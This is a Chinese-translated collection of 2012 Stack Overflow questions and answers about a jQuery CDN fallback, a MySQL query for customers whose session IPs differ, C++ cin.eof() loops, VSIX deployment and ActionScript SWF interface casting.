你的代码看起来不错。检查这里，[http://jsfiddle.net/muthkum/P5uS2/](http://jsfiddle.net/muthkum/P5uS2/)。使用 FireBug 或 Chrome Inspector 检查`<body>`标签。

确保包含`jquery`文件。

# javascript - 如何使用 JavaScript 检测不同域上的文件是否可访问？

> ID：13343989
> 
> 赞同：0
> 
> 时间：2012-11-12T12:48:00.030
> 
> 标签：javascript

我正在为我的 javascript 框架使用第 3 方 CDN 服务器。但有时这些服务器会崩溃，我的整个网站都无法呈现。因此，如果不使用本地服务器，我想首先查找该服务器上是否存在文件。有谁知道一些好的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T13:28:51.880

`<script> !window.jQuery && document.write(unescape('%3Cscript src="js/libs/jquery-1.4.2.js"%3E%3C/script%3E'))</script>`

来源：[http ://weblogs.asp.net/jgalloway/archive/2010/01/21/using-cdn-hosted-jquery-with-a-local-fall-back-copy.aspx](http://weblogs.asp.net/jgalloway/archive/2010/01/21/using-cdn-hosted-jquery-with-a-local-fall-back-copy.aspx)

您可以尝试使用由 cdn 加载的其中一个 js 文件中定义的函数，如果未设置，您可以加载它的本地副本。

您可以在许多网页中看到这一点（HTML5 Boilerplate [http://html5boilerplate.com/](http://html5boilerplate.com/)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:31:00.033

您可以使用脚本加载器，例如[YepNope](http://yepnopejs.com/)：

> yepnope.js 有能力做资源回退并且仍然与第一个并行下载依赖脚本。更清楚：

```
yepnope([{
  load: 'http:/­/ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js',
  complete: function () {
    if (!window.jQuery) {
      yepnope('local/jquery.min.js');
    }
  }
}, {
  load: 'jquery.plugin.js',
  complete: function () {
    jQuery(function () {
      jQuery('div').plugin();
    });
  }
}]); 
```

# mysql - MySQL返回基于差异

> ID：13343990
> 
> 赞同：0
> 
> 时间：2012-11-12T12:48:02.080
> 
> 标签：mysql, sql, join

我正在尝试运行查询以仅在客户用于会话的 IP 地址不同时才返回客户的名字和姓氏。

例如：

```
Customer 1 makes Order on Session IP address: 192.168.12.1
Customer 1 makes Order on Session IP address: 192.168.12.2

Customer 2 makes Order on Session IP address: 192.168.12.3
Customer 2 makes Order on Session IP address: 192.168.12.3

Return Customer where IP address is not same (Customer 1) 
```

但是，我不知道如何指定 IP 地址的差异。

我目前拥有的是：

```
Select Cust_First, Cust_Last
FROM customer

LEFT join Session
On customer.cust_ID = session.Cust_ID

LEFT join Order
On session.Ses_ID = order.Session_ID

Where Ses_IPAddress # Is different for the same customer? 
```

我将用必要的字段详细说明表格：

```
Customer:
PK: Cust_ID
row: Cust_First
row: Cust_Last

Session:
PK: Ses_ID
FK: Cust_ID
Row: Ses_IPAddress

Order:
PK: Order_ID
FK Ses_ID 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:01:15.530

没有看到源数据和输出就无法预测。可能是这个？

```
Select customer.Cust_First, customer.Cust_Last
FROM customer

LEFT join session
On customer.Cust_ID = session.Cust_ID

LEFT join order
On session.Ses_ID = order.Session_ID

GROUP BY customer.Cust_ID, session.Ses_IPAddress
HAVING COUNT(*) > 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:04:07.653

实际上，这项任务比您尝试完成它的方式要容易得多。只需从符合您逻辑的客户中选择这些客户即可。

```
SELECT Cust_First, Cust_Last
FROM Customer
WHERE Cust_ID IN (
    SELECT Cust_ID
    FROM Session
    JOIN Order On Session.Ses_ID = Order.Ses_ID
    GROUP BY Cust_ID, Session.Ses_IPAddress 
    HAVING COUNT(1) > 1
) 
```

# c++ - C++ - 为什么 cin.eof() 读取最后一个字符两次？

> ID：13343991
> 
> 赞同：3
> 
> 时间：2012-11-12T12:48:03.013
> 
> 标签：c++, eof, cin

> **可能重复：**
> [为什么循环条件内的 iostream::eof 被认为是错误的？](https://stackoverflow.com/questions/5605125/why-is-iostreameof-inside-a-loop-condition-considered-wrong)

我有一个很简单的问题...

```
#include<iostream>
using namespace std;
int main()
{
    char x;
    while(!cin.eof())
    {
        cin>>x;
        cout<<"char: "<< x << endl;
    }
    return 0;
} 
```

为什么当我尝试在 Linux 上运行此代码时：
./file_name < test_file.txt
结果是：
char: a
char: b
char: c
char: d
char: d
当 test_file.txt 仅为：
abcd

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-12T12:53:18.977

通过输入操作*失败*来检测文件结尾。

所以，在

```
 cin>>x;
    cout<<"char: "<< x << endl; 
```

即使输入操作失败，也会执行输出语句。

当它失败时，它不会更新`x`。

与其测试`.eof()`，不如测试`.fail()`。

您可以通过直接使用流对象作为条件来做到这一点，例如

```
#include<iostream>
using namespace std;
int main()
{
    char x;
    while( cin >> x )
    {
        cout<<"char: "<< x << endl;
    }
} 
```

在这里，表达式`cin >> x`执行一个可能更新的输入操作`x`，并作为其*表达式结果*返回对流的引用，即 to `cin`。所以`cin`被直接用作条件。这会调用到布尔值的转换，该布尔值被定义为它本身等价于`!cin.fail()`（即，`cin >> x`作为条件的表达式等价于写作`!(cin >> x).fail()`，或者，作为逗号表达式，`(cin >> x, !cin.fail())`）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T12:51:04.457

您正在使用稍微错误的模式从文件中读取。正确的形式是

```
while(cin >> x) {
    cout<<"char: "<< x << endl;
} 
```

请记住，它会`eof`告诉您*是否尝试读取输入末尾的内容*；它不会告诉您是否*即将这样做*。您的原始代码`d`第一次读取，发现它没有尝试读取结尾，然后尝试再次读取。此读取失败，但您现在位于循环内并`x`具有`d`上一次迭代的值，因此再次打印。

上面的代码在尝试读入;*之后*测试流的状态（顺便说一下，它不仅会捕获文件结尾，还会捕获错误） 。`x`因此，在第一次读取失败后，根本不会执行循环。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-12T13:19:06.227

您必须使用文件大小的 for 循环来避免空字符

# visual-studio - 自动将 VSIX 部署到 Visual Studio 库

> ID：13343993
> 
> 赞同：4
> 
> 时间：2012-11-12T12:48:07.960
> 
> 标签：visual-studio, build-automation, visual-studio-extensions

我们希望自动上传已写入 Visual Studio 库的 Visual Studio 扩展。

我们目前使用 CruiseControl.Net、Msbuild 文件和 Powershell 脚本的组合来自动部署我们框架的所有部分。

但是，我们希望自动将我们创建的开发工具部署到 Visual Studio 库。

这些工具是使用 Visual Studio 2012 构建的。

感谢您提供任何有用的建议或指示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-05-18T19:34:36.523

使用 Canopy 和 FAKE 可以做到这一点。我刚刚在[https://github.com/fsprojects/Paket.VisualStudio/blob/master/build.fsx#L177](https://github.com/fsprojects/Paket.VisualStudio/blob/master/build.fsx#L177)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T17:20:41.947

不幸的是，没有好的方法可以做到这一点。没有用于上传扩展的公开 API。我知道的唯一方法是创建一个 Web 浏览器的实例，并简单地自动化填写表格和浏览菜单的过程。

# javascript - jQuery / Javascript 正则表达式错误，但有效

> ID：13343994
> 
> 赞同：2
> 
> 时间：2012-11-12T12:48:11.640
> 
> 标签：javascript, jquery, regex

我正在使用[jCarousel](http://sorgalla.com/projects/jcarousel/examples/dynamic_ajax.html)从文本文件中动态加载项目。但我想根据图像 id 添加一个链接到轮播，所以我使用正则表达式来计算图像文件名并从那里开始。一切正常，但是我收到以下错误：

```
TypeError: Cannot read property '1' of null [http://localhost:64479/TestPage_ToolTips.aspx:71] 
```

第 70 和 71 行是：

```
 var testRE = url.match("t_(.*).jpg");
        return '<a href="viewprofile.aspx?id=' + testRE[1] + '"><img src="' + url + '" width="75" height="75" alt="" /></a>'; 
```

我猜错误在于`testRE[1]`- 但是它在加载页面时在 html 中正常工作。我只是不希望页面上出现 javascript 错误。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:51:01.177

将您的代码更改为：

```
var testRE = url.match("t_(.*)\.jpg") || [undefined, ""]; 
```

**你应该摆脱这个错误。**注意文件名正则表达式中的转义点分隔符。

问题实际上如您所料。`testRE`因此`null`您无法访问其数组元素。这是因为您的字符串不匹配。生成的 URL 是否正确取决于您的要求。

# actionscript-3 - 将加载的 SWF 转换为接口

> ID：13343996
> 
> 赞同：0
> 
> 时间：2012-11-12T12:48:20.627
> 
> 标签：actionscript-3, flash, casting

我正在尝试使用接口加载远程 SWF 并访问它的方法和属性。（这里有一个类似的问题，就“这很奇怪！”但没有解决：[Loading swf and using it through interface](https://stackoverflow.com/questions/3465612/loading-swf-and-using-it-through-interface)）

我的远程 SWF 如下所示：

```
package 
{   
    import flash.display.Sprite;
    import flash.events.Event;
    import flash.system.Security;

    import IMultiplayer;

    [SWF(width="238", height="60", frameRate="60", backgroundColor="#FFFFFF")]
    public class Main extends Sprite implements IMultiplayer
    {
        public function init(e:Event):void
        {

        }

        public function TEST():void
        {
            trace("TEST()");
        }   
    }
} 
```

然后我有一个如下所示的界面：

```
package
{
    import flash.events.*;
    import flash.display.*;

    public interface IMultiplayer
    {
        function init(e:Event):void;
        function TEST():void;
    }
} 
```

最后，我有一个加载器类，它下拉 SWF 并尝试将其转换为远程 SWF 实现的相同接口。编辑 - 道歉的长度，被要求发布完整的来源：

```
package uk.co.MyDomain
{
    import flash.display.DisplayObject;
    import flash.display.Loader;
    import flash.display.LoaderInfo;
    import flash.display.MovieClip;
    import flash.display.Sprite;
    import flash.events.ErrorEvent;
    import flash.events.Event;
    import flash.events.EventDispatcher;
    import flash.events.IEventDispatcher;
    import flash.events.IOErrorEvent;
    import flash.events.TimerEvent;
    import flash.net.URLRequest;
    import flash.system.ApplicationDomain;
    import flash.system.LoaderContext;
    import flash.system.Security;
    import flash.system.SecurityDomain;
    import flash.utils.Timer;

    import uk.co.MyDomain.*;

    import utils.Console;

    public class MultiplayerLoader extends Sprite
    {
        private var ld:Loader;
        private var _environment:String;
        public var _mpInstance:IMultiplayer;

        private const SANDBOX_SWF:String = "http://static.sandbox.dev.MyDomain.co.uk/smartfoxtest/dev/swf/MP.swf";

        public function MultiplayerLoader(environment:String)
        {
            _environment = environment;
        }

        public function loadMultiplayer():void
        {
            ld = new Loader();

            var context:LoaderContext = new LoaderContext(false, ApplicationDomain.currentDomain);

            ld.contentLoaderInfo.addEventListener(Event.COMPLETE, multiplayerLoaded);
            ld.contentLoaderInfo.addEventListener(ErrorEvent.ERROR, onLoadError);
            ld.contentLoaderInfo.addEventListener(IOErrorEvent.IO_ERROR, onIOLoadError);
            ld.contentLoaderInfo.addEventListener(IOErrorEvent.DISK_ERROR, onDiskError);
            ld.contentLoaderInfo.addEventListener(IOErrorEvent.NETWORK_ERROR, onNetworkError);
            ld.contentLoaderInfo.addEventListener(IOErrorEvent.VERIFY_ERROR, onVerifyError);

            if(Security.sandboxType == Security.REMOTE)
            {
                trace('[MP Loader] Loading with context');
                ld.load(new URLRequest(SANDBOX_SWF), context);      
            }
            else
            {
                trace('[MP Loader] Loading with NO context');
                ld.load(new URLRequest(SANDBOX_SWF));   
            }
        }

        private function onIOLoadError(e:IOErrorEvent):void
        {
            notifyFailure('IOLoadError');
        }

        private function onDiskError(e:IOErrorEvent):void
        {
            notifyFailure('IOLoadError');
        }

        private function onNetworkError(e:IOErrorEvent):void
        {
            notifyFailure('IOLoadError');
        }

        private function onVerifyError(e:IOErrorEvent):void
        {
            notifyFailure('IOLoadError');
        }

        private function onLoadError(e:ErrorEvent):void
        {
            notifyFailure('IOLoadError');
        }

        private function multiplayerLoaded(e:Event):void
        {   
            var tester:IMultiplayer = e.currentTarget.content as IMultiplayer;          
            Console.log('Loaded: ' + tester);

            dispatchEvent(new MultiplayerEvent(MultiplayerEvent.SWF_LOAD_SUCCESS)); 
        }

        private function notifyFailure(reason:String):void
        {
            var failEvent:MultiplayerEvent = new MultiplayerEvent(MultiplayerEvent.SWF_LOAD_FAILURE);
            failEvent.params = {'reason':reason}

            dispatchEvent(failEvent);
        }
    }
} 
```

现在，如果我不强制它使用接口，我可以成功地追踪它并调用函数（因此 e.target.content.TEST() 将触发）。但是，一旦我将其转换为界面，它就会失败。

有任何想法吗？

**编辑**

好的，我在两个应用程序之间共享的自定义事件类中遇到了同样的问题。Flash 错误，说它不能从一个类转换到另一个类——即使它们是相同的，它们在不同的项目中，所以我想象不同的命名空间。我认为加载到同一个 applicationDomain 会解决这个问题，但事实并非如此。有没有其他方法可以在不求助于公共图书馆/SWC 或类似的情况下解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T16:41:55.023

我认为这可能是应用程序域的问题。加载的 SWF 驻留在其自己的应用程序域中，因此它不共享完全相同的接口。尝试使用`applicationDomain`加载器的 LoaderInfo 对象的属性将 swf 加载到»当前应用程序域«。

看[这里](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/LoaderContext.html)

祝你好运……</p>

编辑：：

它必须在加载程序加载方法中完成

```
var context:LoaderContext = new LoaderContext(false, ApplicationDomain.currentDomain);
var loader:Loader = new Loader();
loader.load(new URLRequest("myButtons.swf"), context); 
```

从[这里](http://annafilina.com/blog/application-domain-and-external-swf-loading/)

编辑 2::

一旦我遇到一个更奇怪的错误，这是由于我创建了一个接口，编译了»加载文件«和»加载的文件«，通过添加方法更改了接口并忘记编译»to加载文件«（有很多）。也许发生了这样的事情……</p>

编辑 3::

如果我没记错的话，必须等待`Event.INIT`加载 swf 的事件，在此事件之后，加载的 swf 的构造函数首先运行。

编辑 4::

找到[这个](http://help.adobe.com/en_US/as3/dev/WSd75bf4610ec9e22f43855da312214da1d8f-8000.html)，也许你需要做：

```
var YourInterfaceClass:Class = ApplicationDomain.currentDomain.getDefinition( "YourInterface" ) as Class; 
var myInstance:YourINterface = event.target.content as YourInterface; 
```